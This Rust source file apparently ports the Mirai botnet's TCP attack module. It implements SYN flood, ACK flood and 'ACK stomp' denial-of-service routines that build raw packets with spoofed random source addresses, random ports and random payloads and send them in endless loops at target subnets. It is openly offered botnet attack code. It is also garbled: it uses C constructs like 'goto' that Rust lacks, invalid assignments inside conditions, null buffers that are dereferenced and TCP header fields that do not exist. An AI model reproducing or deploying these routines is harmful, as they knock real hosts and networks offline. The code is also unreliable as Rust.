use std::ptr;
use std::net::Ipv4Addr;
use std::ffi::CString;
use libc::{sockaddr_in, AF_INET, SOCK_RAW, IPPROTO_TCP, socket, htons, setsockopt, IPPROTO_IP, IP_HDRINCL, sockaddr, MSG_NOSIGNAL};
use libc::close;
use libc::time_t;

type BOOL = bool;
type uint8_t = u8;
type uint16_t = u16;
type uint32_t = u32;
type port_t = u16;
type socklen_t = u32;

#[repr(C)]
struct AttackTarget {
    sock_addr: sockaddr_in,
    addr: Ipv4Addr,
    netmask: uint8_t,
}

#[repr(C)]
struct AttackOption {
    val: CString,
    key: uint8_t,
}

#[repr(C)]
struct IpHdr {
    version_ihl: uint8_t,
    tos: uint8_t,
    tot_len: uint16_t,
    id: uint16_t,
    frag_off: uint16_t,
    ttl: uint8_t,
    protocol: uint8_t,
    check: uint16_t,
    saddr: u32,
    daddr: u32,
}

#[repr(C)]
struct TcpHdr {
    source: uint16_t,
    dest: uint16_t,
    seq: uint32_t,
    ack_seq: uint32_t,
    doff: uint8_t,
    flags: uint8_t,
    window: uint16_t,
    check: uint16_t,
    urg_ptr: uint16_t,
}

#[repr(C)]
struct AttackStompData {
    addr: Ipv4Addr,
    seq: uint32_t,
    ack_seq: uint32_t,
    sport: port_t,
    dport: port_t,
}


fn attack_tcp_syn(targs_len: uint8_t, targs: *mut AttackTarget, opts_len: uint8_t, opts: *const AttackOption) {
    unsafe {
        let mut fd: i32;
        let mut pkts = vec![ptr::null_mut(); targs_len as usize];
        let ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0) as uint8_t;
        let ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff) as uint16_t;
        let ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64) as uint8_t;
        let dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, true);
        let sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff) as port_t;
        let dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff) as port_t;
        let seq = attack_get_opt_int(opts_len, opts, ATK_OPT_SEQRND, 0xffff) as uint32_t;
        let ack = attack_get_opt_int(opts_len, opts, ATK_OPT_ACKRND, 0) as uint32_t;
        let urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, false);
        let ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, false);
        let psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, false);
        let rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, false);
        let syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, true);
        let fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, false);
        let source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);

        if (fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1 {
            #[cfg(debug_assertions)]
            println!("Failed to create raw socket. Aborting attack");
            return;
        }

        let i = 1;
        if setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i as *const _ as *const c_void, std::mem::size_of_val(&i) as u32) == -1 {
            #[cfg(debug_assertions)]
            println!("Failed to set IP_HDRINCL. Aborting");
            close(fd);
            return;
        }

        for i in 0..targs_len {
            let iph = &mut *(pkts[i as usize] as *mut IpHdr);
            let tcph = &mut *(iph.add(1) as *mut TcpHdr);
            let opts = &mut *(tcph.add(1) as *mut u8);

            iph.version_ihl = 0x45;
            iph.tos = ip_tos;
            iph.tot_len = htons(std::mem::size_of::<IpHdr>() as uint16_t + std::mem::size_of::<TcpHdr>() as uint16_t + 20);
            iph.id = htons(ip_ident);
            iph.ttl = ip_ttl;
            if dont_frag != 0 {
                iph.frag_off = htons(1 << 14);
            }
            iph.protocol = IPPROTO_TCP as uint8_t;
            iph.saddr = source_ip;
            iph.daddr = targs[i as usize].addr.into();

            tcph.source = htons(sport);
            tcph.dest = htons(dport);
            tcph.seq = htons(seq);
            tcph.doff = 10;
            tcph.urg = urg_fl;
            tcph.ack = ack_fl;
            tcph.psh = psh_fl;
            tcph.rst = rst_fl;
            tcph.syn = syn_fl;
            tcph.fin = fin_fl;

            *opts.add(0) = PROTO_TCP_OPT_MSS;
            *opts.add(1) = 4;
            *((opts.add(2) as *mut uint16_t)) = htons(1400 + (rand_next() & 0x0f));
            opts = opts.add(std::mem::size_of::<uint16_t>());

            *opts.add(0) = PROTO_TCP_OPT_SACK;
            *opts.add(1) = 2;

            *opts.add(0) = PROTO_TCP_OPT_TSVAL;
            *opts.add(1) = 10;
            *((opts.add(2) as *mut uint32_t)) = rand_next();
            opts = opts.add(std::mem::size_of::<uint32_t>());
            *((opts.add(0) as *mut uint32_t)) = 0;
            opts = opts.add(std::mem::size_of::<uint32_t>());

            *opts.add(0) = 1;

            *opts.add(0) = PROTO_TCP_OPT_WSS;
            *opts.add(1) = 3;
            *opts.add(2) = 6;
        }

        while true {
            for i in 0..targs_len {
                let pkt = pkts[i as usize];
                let iph = &mut *(pkt as *mut IpHdr);
                let tcph = &mut *(iph.add(1) as *mut TcpHdr);

                if targs[i as usize].netmask < 32 {
                    iph.daddr = htonl(ntohl(targs[i as usize].addr.into()) + (rand_next() >> targs[i as usize].netmask));
                }

                if source_ip == 0xffffffff {
                    iph.saddr = rand_next();
                }
                if ip_ident == 0xffff {
                    iph.id = rand_next() & 0xffff;
                }
                if sport == 0xffff {
                    tcph.source = rand_next() & 0xffff;
                }
                if dport == 0xffff {
                    tcph.dest = rand_next() & 0xffff;
                }
                if seq == 0xffff {
                    tcph.seq = rand_next();
                }
                if ack == 0xffff {
                    tcph.ack_seq = rand_next();
                }
                if urg_fl {
                    tcph.urg_ptr = rand_next() & 0xffff;
                }

                iph.check = 0;
                iph.check = checksum_generic(iph as *const _ as *const uint16_t, std::mem::size_of::<IpHdr>());

                tcph.check = 0;
                tcph.check = checksum_tcpudp(iph, tcph, htons(std::mem::size_of::<TcpHdr>() + 20), std::mem::size_of::<TcpHdr>() + 20);

                targs[i as usize].sock_addr.sin_port = tcph.dest;
                sendto(fd, pkt as *const _, std::mem::size_of::<IpHdr>() + std::mem::size_of::<TcpHdr>() + 20, MSG_NOSIGNAL, &targs[i as usize].sock_addr as *const _ as *const sockaddr, std::mem::size_of::<sockaddr_in>() as socklen_t);
            }

            #[cfg(debug_assertions)]
            break;
            #[cfg(debug_assertions)]
            if errno != 0 {
                println!("errno = {}", errno);
            }
        }
    }
}
fn attack_tcp_ack(targs_len: uint8_t, targs: *mut AttackTarget, opts_len: uint8_t, opts: *const AttackOption) {
    unsafe {
        let mut fd: i32;
        let mut pkts = vec![ptr::null_mut(); targs_len as usize];
        let ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0) as uint8_t;
        let ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff) as uint16_t;
        let ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64) as uint8_t;
        let dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, false);
        let sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff) as port_t;
        let dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff) as port_t;
        let seq = attack_get_opt_int(opts_len, opts, ATK_OPT_SEQRND, 0xffff) as uint32_t;
        let ack = attack_get_opt_int(opts_len, opts, ATK_OPT_ACKRND, 0xffff) as uint32_t;
        let urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, false);
        let ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, true);
        let psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, false);
        let rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, false);
        let syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, false);
        let fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, false);
        let data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
        let data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, true);
        let source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);

        if (fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1 {
            #[cfg(debug_assertions)]
            println!("Failed to create raw socket. Aborting attack");
            return;
        }

        let i = 1;
        if setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i as *const _ as *const c_void, std::mem::size_of_val(&i) as u32) == -1 {
            #[cfg(debug_assertions)]
            println!("Failed to set IP_HDRINCL. Aborting");
            close(fd);
            return;
        }

        for i in 0..targs_len {
            let iph = &mut *(pkts[i as usize] as *mut IpHdr);
            let tcph = &mut *(iph.add(1) as *mut TcpHdr);
            let payload = &mut *(tcph.add(1) as *mut u8);

            iph.version_ihl = 0x45;
            iph.tos = ip_tos;
            iph.tot_len = htons(std::mem::size_of::<IpHdr>() as uint16_t + std::mem::size_of::<TcpHdr>() as uint16_t + data_len);
            iph.id = htons(ip_ident);
            iph.ttl = ip_ttl;
            if dont_frag != 0 {
                iph.frag_off = htons(1 << 14);
            }
            iph.protocol = IPPROTO_TCP as uint8_t;
            iph.saddr = source_ip;
            iph.daddr = targs[i as usize].addr.into();

            tcph.source = htons(sport);
            tcph.dest = htons(dport);
            tcph.seq = htons(seq);
            tcph.doff = 5;
            tcph.urg = urg_fl;
            tcph.ack = ack_fl;
            tcph.psh = psh_fl;
            tcph.rst = rst_fl;
            tcph.syn = syn_fl;
            tcph.fin = fin_fl;
            tcph.window = rand_next() & 0xffff;
            if psh_fl {
                tcph.psh = true;
            }

            rand_str(payload, data_len);
        }

        while true {
            for i in 0..targs_len {
                let pkt = pkts[i as usize];
                let iph = &mut *(pkt as *mut IpHdr);
                let tcph = &mut *(iph.add(1) as *mut TcpHdr);
                let data = &mut *(tcph.add(1) as *mut u8);

                if targs[i as usize].netmask < 32 {
                    iph.daddr = htonl(ntohl(targs[i as usize].addr.into()) + (rand_next() >> targs[i as usize].netmask));
                }

                if source_ip == 0xffffffff {
                    iph.saddr = rand_next();
                }
                if ip_ident == 0xffff {
                    iph.id = rand_next() & 0xffff;
                }
                if sport == 0xffff {
                    tcph.source = rand_next() & 0xffff;
                }
                if dport == 0xffff {
                    tcph.dest = rand_next() & 0xffff;
                }
                if seq == 0xffff {
                    tcph.seq = rand_next();
                }
                if ack == 0xffff {
                    tcph.ack_seq = rand_next();
                }

                if data_rand != 0 {
                    rand_str(data, data_len);
                }

                iph.check = 0;
                iph.check = checksum_generic(iph as *const _ as *const uint16_t, std::mem::size_of::<IpHdr>());

                tcph.check = 0;
                tcph.check = checksum_tcpudp(iph, tcph, htons(std::mem::size_of::<TcpHdr>() + data_len), std::mem::size_of::<TcpHdr>() + data_len);

                targs[i as usize].sock_addr.sin_port = tcph.dest;
                sendto(fd, pkt as *const _, std::mem::size_of::<IpHdr>() + std::mem::size_of::<TcpHdr>() + data_len, MSG_NOSIGNAL, &targs[i as usize].sock_addr as *const _ as *const sockaddr, std::mem::size_of::<sockaddr_in>() as socklen_t);
            }

            #[cfg(debug_assertions)]
            break;
            #[cfg(debug_assertions)]
            if errno != 0 {
                println!("errno = {}", errno);
            }
        }
    }
}

fn attack_tcp_stomp(targs_len: uint8_t, targs: *mut AttackTarget, opts_len: uint8_t, opts: *const AttackOption) {
    unsafe {
        let mut rfd: i32;
        let mut stomp_data = vec![AttackStompData::default(); targs_len as usize];
        let mut pkts = vec![ptr::null_mut(); targs_len as usize];
        let ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0) as uint8_t;
        let ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff) as uint16_t;
        let ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64) as uint8_t;
        let dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, true);
        let dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff) as port_t;
        let urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, false);
        let ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, true);
        let psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, true);
        let rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, false);
        let syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, false);
        let fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, false);
        let data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 768);
        let data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, true);

        if (rfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1 {
            #[cfg(debug_assertions)]
            println!("Could not open raw socket!");
            return;
        }

        let i = 1;
        if setsockopt(rfd, IPPROTO_IP, IP_HDRINCL, &i as *const _ as *const c_void, std::mem::size_of_val(&i) as u32) == -1 {
            #[cfg(debug_assertions)]
            println!("Failed to set IP_HDRINCL. Aborting");
            close(rfd);
            return;
        }

        for i in 0..targs_len {
            let mut fd: i32;
            let addr = &mut targs[i as usize].sock_addr;
            let mut recv_addr: sockaddr_in = std::mem::zeroed();
            let mut recv_addr_len: socklen_t = std::mem::size_of::<sockaddr_in>() as socklen_t;
            let mut pktbuf = [0u8; 256];
            let start_recv: time_t;

        stomp_setup_nums:
            if (fd = socket(AF_INET, SOCK_STREAM, 0)) == -1 {
                #[cfg(debug_assertions)]
                println!("Failed to create socket!");
                continue;
            }

            fcntl(fd, F_SETFL, fcntl(fd, F_GETFL, 0) | O_NONBLOCK);

            addr.sin_family = AF_INET as u16;
            if targs[i as usize].netmask < 32 {
                addr.sin_addr.s_addr = htonl(ntohl(targs[i as usize].addr.into()) + (rand_next() >> targs[i as usize].netmask));
            } else {
                addr.sin_addr.s_addr = targs[i as usize].addr.into();
            }
            if dport == 0xffff {
                addr.sin_port = rand_next() & 0xffff;
            } else {
                addr.sin_port = htons(dport);
            }

            connect(fd, addr as *const _ as *const sockaddr, std::mem::size_of::<sockaddr_in>() as socklen_t);
            start_recv = time(std::ptr::null_mut());

            while true {
                let ret = recvfrom(rfd, pktbuf.as_mut_ptr() as *mut _, pktbuf.len(), MSG_NOSIGNAL, &mut recv_addr as *mut _ as *mut sockaddr, &mut recv_addr_len);
                if ret == -1 {
                    #[cfg(debug_assertions)]
                    println!("Could not listen on raw socket!");
                    return;
                }
                if recv_addr.sin_addr.s_addr == addr.sin_addr.s_addr && ret > (std::mem::size_of::<IpHdr>() + std::mem::size_of::<TcpHdr>()) as i32 {
                    let tcph = &*(pktbuf.as_ptr().add(std::mem::size_of::<IpHdr>()) as *const TcpHdr);

                    if tcph.source == addr.sin_port {
                        if tcph.syn && tcph.ack {
                            let iph = &mut *(pkts[i as usize] as *mut IpHdr);
                            let tcph = &mut *(iph.add(1) as *mut TcpHdr);
                            let payload = &mut *(tcph.add(1) as *mut u8);

                            stomp_data[i as usize].addr = addr.sin_addr.s_addr.into();
                            stomp_data[i as usize].seq = ntohl(tcph.seq);
                            stomp_data[i as usize].ack_seq = ntohl(tcph.ack_seq);
                            stomp_data[i as usize].sport = tcph.dest;
                            stomp_data[i as usize].dport = addr.sin_port;

                            #[cfg(debug_assertions)]
                            println!("ACK Stomp got SYN+ACK!");

                            pkts[i as usize] = libc::malloc(std::mem::size_of::<IpHdr>() + std::mem::size_of::<TcpHdr>() + data_len) as *mut _;
                            iph.version_ihl = 0x45;
                            iph.tos = ip_tos;
                            iph.tot_len = htons(std::mem::size_of::<IpHdr>() as uint16_t + std::mem::size_of::<TcpHdr>() as uint16_t + data_len);
                            iph.id = htons(ip_ident);
                            iph.ttl = ip_ttl;
                            if dont_frag != 0 {
                                iph.frag_off = htons(1 << 14);
                            }
                            iph.protocol = IPPROTO_TCP as uint8_t;
                            iph.saddr = LOCAL_ADDR;
                            iph.daddr = stomp_data[i as usize].addr.into();

                            tcph.source = stomp_data[i as usize].sport;
                            tcph.dest = stomp_data[i as usize].dport;
                            tcph.seq = stomp_data[i as usize].ack_seq;
                            tcph.ack_seq = stomp_data[i as usize].seq;
                            tcph.doff = 8;
                            tcph.fin = true;
                            tcph.ack = true;
                            tcph.window = rand_next() & 0xffff;
                            tcph.urg = urg_fl;
                            tcph.ack = ack_fl;
                            tcph.psh = psh_fl;
                            tcph.rst = rst_fl;
                            tcph.syn = syn_fl;
                            tcph.fin = fin_fl;

                            rand_str(payload, data_len);
                            break;
                        } else if tcph.fin || tcph.rst {
                            close(fd);
                            goto stomp_setup_nums;
                        }
                    }
                }

                if time(std::ptr::null_mut()) - start_recv > 10 {
                    #[cfg(debug_assertions)]
                    println!("Couldn't connect to host for ACK Stomp in time. Retrying");
                    close(fd);
                    goto stomp_setup_nums;
                }
            }
        }

        while true {
            for i in 0..targs_len {
                let pkt = pkts[i as usize];
                let iph = &mut *(pkt as *mut IpHdr);
                let tcph = &mut *(iph.add(1) as *mut TcpHdr);
                let data = &mut *(tcph.add(1) as *mut u8);

                if ip_ident == 0xffff {
                    iph.id = rand_next() & 0xffff;
                }

                if data_rand != 0 {
                    rand_str(data, data_len);
                }

                iph.check = 0;
                iph.check = checksum_generic(iph as *const _ as *const uint16_t, std::mem::size_of::<IpHdr>());

                tcph.seq = htons(stomp_data[i as usize].seq + 1);
                tcph.ack_seq = htons(stomp_data[i as usize].ack_seq);
                tcph.check = 0;
                tcph.check = checksum_tcpudp(iph, tcph, htons(std::mem::size_of::<TcpHdr>() + data_len), std::mem::size_of::<TcpHdr>() + data_len);

                targs[i as usize].sock_addr.sin_port = tcph.dest;
                sendto(rfd, pkt as *const _, std::mem::size_of::<IpHdr>() + std::mem::size_of::<TcpHdr>() + data_len, MSG_NOSIGNAL, &targs[i as usize].sock_addr as *const _ as *const sockaddr, std::mem::size_of::<sockaddr_in>() as socklen_t);
            }

            #[cfg(debug_assertions)]
            break;
            #[cfg(debug_assertions)]
            if errno != 0 {
                println!("errno = {}", errno);
            }
        }
    }
}
